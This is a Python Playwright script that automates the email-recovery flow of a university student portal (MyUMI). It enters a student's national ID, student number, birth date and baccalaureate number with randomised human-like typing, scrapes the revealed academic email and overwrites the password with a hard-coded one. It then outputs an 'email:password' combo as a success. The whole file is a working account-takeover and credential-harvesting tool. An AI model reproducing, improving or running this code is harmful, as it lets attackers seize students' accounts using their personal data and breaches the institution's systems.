"""
UMI RECUPMAIL ENGINE — Core verification module for MyUMI portal
Complete & Clean flow with Fast JS Input Scan -> Type fixed password -> 
Click SEND -> Success Popup -> LOGIN_OK.
"""

import re
import time
import random

class LoginState:
    LOGIN_OK = "login_ok"
    LOGIN_ERROR = "login_error"

class UMIEngine:
    def __init__(self):
        pass

    def run_workflow(self, page, arg1, arg2, arg3="", arg4=""):
        cne = str(arg1).strip()
        cin = str(arg2).strip()
        dob = str(arg3).strip()
        bac = str(arg4).strip()
        
        if "/" in str(arg2) or len(str(arg2)) == 8:
            cin = str(arg3).strip()
            dob = str(arg2).strip()
            bac = str(arg4).strip()

        result_data = {
            "cne": cne,
            "dob": dob,
            "status": LoginState.LOGIN_ERROR,
            "extracted_email": None,
            "detail": "Initialized"
        }

        fixed_password = "8eZ@R6a*t=/.FJa"

        try:
            # 1. Page stable check
            try:
                page.wait_for_load_state("domcontentloaded", timeout=25000)
            except Exception:
                result_data["status"] = LoginState.LOGIN_ERROR
                result_data["detail"] = "Failed: Page load timeout / Site Down (Login Error)"
                return result_data

            page.wait_for_timeout(random.randint(1200, 2000))

            # 2. اختيار اللغة الإنجليزية باستخدام 1 Tab ثم ENTER
            try:
                page.keyboard.press("Tab")
                page.wait_for_timeout(300)
                page.keyboard.press("Enter")
                page.wait_for_timeout(1200)
            except Exception:
                try:
                    page.locator('text=English').first.click()
                    page.wait_for_timeout(1000)
                except Exception:
                    pass

            # 3. الضغط على زر استعادة البريد الأكاديمي (متعدد اللغات)
            recup_clicked = False
            for btn_sel in [
                'text=استعادة البريد الإلكتروني الأكاديمي',
                'button:has-text("استعادة")', 
                'a:has-text("استعادة")',
                'button:has-text("RECUPERATION")', 
                'a:has-text("RECUPERATION")', 
                'button:has-text("Récupération")',
                'text=RECUPERATION', 
                'text=Récupération',
                '.btn-danger',
                'button.red',
                'a[href*="recup"]',
                'a[href*="password"]'
            ]:
                try:
                    btn = page.locator(btn_sel).first
                    if btn.count() > 0 and btn.is_visible():
                        btn.click()
                        recup_clicked = True
                        page.wait_for_timeout(2000)
                        break
                except Exception:
                    continue

            if not recup_clicked:
                try:
                    page.locator('button, a').filter(has_text=re.compile(r'recup|استعادة|pass|mot de passe', re.I)).first.click()
                    page.wait_for_timeout(2000)
                except Exception:
                    pass

            # 4. الانتظار حتى تظهر الحقول الأربعة في الـ Popup الأولى
            try:
                page.wait_for_selector('input', timeout=5000)
            except Exception:
                pass

            inputs = page.locator('input')
            if inputs.count() < 4:
                for alt_sel in ['text=Recovery', 'text=Compte', 'text=استعادة', 'button']:
                    try:
                        page.locator(alt_sel).first.click()
                        page.wait_for_timeout(1500)
                    except:
                        pass
                inputs = page.locator('input')
                if inputs.count() < 4:
                    result_data["status"] = LoginState.LOGIN_ERROR
                    result_data["detail"] = "Failed: Required input fields (4 fields) missing (Login Error)"
                    return result_data

            cne_input = inputs.nth(0)
            cin_input = inputs.nth(1)
            dob_input = inputs.nth(2)
            bac_input = inputs.nth(3)

            # إدخال CNE
            cne_input.click()
            page.wait_for_timeout(200)
            cne_input.fill("")
            for char in str(cne):
                cne_input.press_sequentially(char, delay=random.randint(120, 250))
            page.wait_for_timeout(500)

            # إدخال CIN
            cin_input.click()
            page.wait_for_timeout(200)
            cin_input.fill("")
            for char in str(cin):
                cin_input.press_sequentially(char, delay=random.randint(120, 250))
            page.wait_for_timeout(500)

            # تنسيق DOB
            clean_dob = re.sub(r'[^0-9]', '', str(dob))
            if len(clean_dob) == 8:
                day = clean_dob[:2].zfill(2)
                month = clean_dob[2:4].zfill(2)
                year = clean_dob[4:]
                formatted_dob = f"{month}{day}{year}"
            else:
                formatted_dob = str(dob)

            dob_input.click()
            page.wait_for_timeout(200)
            dob_input.fill("")
            for char in str(formatted_dob):
                dob_input.press_sequentially(char, delay=random.randint(120, 250))
            page.wait_for_timeout(500)

            # إدخال BAC
            bac_input.click()
            page.wait_for_timeout(200)
            bac_input.fill("")
            for char in str(bac):
                bac_input.press_sequentially(char, delay=random.randint(120, 250))
            page.wait_for_timeout(900)

            # 5. الضغط على زر NEXT (متعدد اللغات)
            next_clicked = False
            for next_sel in ['button:has-text("NEXT")', 'button:has-text("Next")', 'button:has-text("Suivant")', 'button[type="submit"]', '.btn-next']:
                try:
                    nb = page.locator(next_sel).first
                    if nb.count() > 0:
                        nb.click()
                        next_clicked = True
                        break
                except Exception:
                    continue
            if not next_clicked:
                try:
                    page.locator('button').filter(has_text=re.compile(r'next|suivant', re.I)).first.click()
                except Exception:
                    pass

            # 6. --- الفحص السوري الفوري للأخطاء الحمراء فور الضغط على NEXT ---
            page.wait_for_timeout(2000)
            body_text = page.locator("body").inner_text()
            low_text = body_text.lower()

            error_keywords = [
                "aucun étudiant trouvé", 
                "email académique non généré", 
                "aucune inscription trouvée", 
                "veuillez vérifier l'exactitude",
                "incorrect", 
                "invalide", 
                "erreur", 
                "غير صحيح"
            ]
            
            if any(kw in low_text for kw in error_keywords):
                result_data["status"] = LoginState.LOGIN_ERROR
                result_data["detail"] = "Failed: Error popup detected immediately (Login Error)"
                return result_data

            general_site_errors = ["500 internal", "bad gateway", "service unavailable", "maintenance", "gateway timeout"]
            if any(err in low_text for err in general_site_errors):
                result_data["status"] = LoginState.LOGIN_ERROR
                result_data["detail"] = "Failed: Server Error / Maintenance (Login Error)"
                return result_data

            password_field = page.locator('input[type="password"]')
            
            if password_field.count() > 0 or "update your password" in low_text or "@edu.umi.ac.ma" in low_text:
                
                # --- استخراج الإيميل بـ JavaScript قاطع ومباشر ---
                extracted_email = None
                try:
                    extracted_email = page.evaluate("""() => {
                        const inputs = document.querySelectorAll('input');
                        for (let input of inputs) {
                            if (input.value && input.value.includes('@edu.umi.ac.ma')) {
                                return input.value.trim().toLowerCase();
                            }
                        }
                        const modal = document.querySelector('.modal, .popup, [role="dialog"], body');
                        const match = modal.innerText.match(/[\\w\\.-]+@edu\\.umi\\.ac\\.ma/i);
                        return match ? match[0].toLowerCase() : null;
                    }""")
                except Exception:
                    pass

                if not extracted_email or "@edu.umi.ac.ma" not in extracted_email:
                    result_data["status"] = LoginState.LOGIN_ERROR
                    result_data["detail"] = "Failed: JS Direct Email extraction failed (Login Error)"
                    return result_data

                # --- إدخال الباسورد الثابت ---
                try:
                    pass_input = password_field.first
                    pass_input.click()
                    page.wait_for_timeout(300)
                    pass_input.fill("")
                    for char in fixed_password:
                        pass_input.press_sequentially(char, delay=random.randint(100, 200))
                    page.wait_for_timeout(800)
                except Exception:
                    pass

                # --- الضغط على زر SEND ---
                send_clicked = False
                for send_sel in [
                    'button:has-text("SEND")', 
                    'button:has-text("Send")', 
                    'button:has-text("Envoyer")', 
                    'button[type="submit"]',
                    '.btn-warning',
                    '.btn-primary'
                ]:
                    try:
                        s_btn = page.locator(send_sel).first
                        if s_btn.count() > 0 and s_btn.is_visible():
                            s_btn.click()
                            send_clicked = True
                            page.wait_for_timeout(2000)
                            break
                    except Exception:
                        continue

                if not send_clicked:
                    try:
                        page.locator('button').filter(has_text=re.compile(r'send|envoyer', re.I)).first.click()
                        page.wait_for_timeout(2000)
                    except Exception:
                        pass

                # --- الانتظار حتى تظهر النافذة الخضراء وزر OK ---
                try:
                    for _ in range(6):
                        body_after = page.locator("body").inner_text().lower()
                        ok_btn = page.locator('button:has-text("OK"), .btn-success, button.green').first
                        
                        if "succès" in body_after or "success" in body_after or (ok_btn.count() > 0 and ok_btn.is_visible()):
                            if ok_btn.count() > 0 and ok_btn.is_visible():
                                ok_btn.click()
                                page.wait_for_timeout(1000)
                            break
                        page.wait_for_timeout(1000)
                except Exception:
                    pass

                # --- إرسال النتيجة للدينامو ---
                final_combo = f"{extracted_email}:{fixed_password}"
                result_data["status"] = LoginState.LOGIN_OK
                result_data["extracted_email"] = final_combo
                result_data["detail"] = f"Success | {final_combo}"
                return result_data

            result_data["status"] = LoginState.LOGIN_ERROR
            result_data["detail"] = "Failed: Unknown response state (Login Error)"

        except Exception as e:
            result_data["status"] = LoginState.LOGIN_ERROR
            result_data["detail"] = f"Failed: Exception - {type(e).__name__} (Login Error)"

        return result_data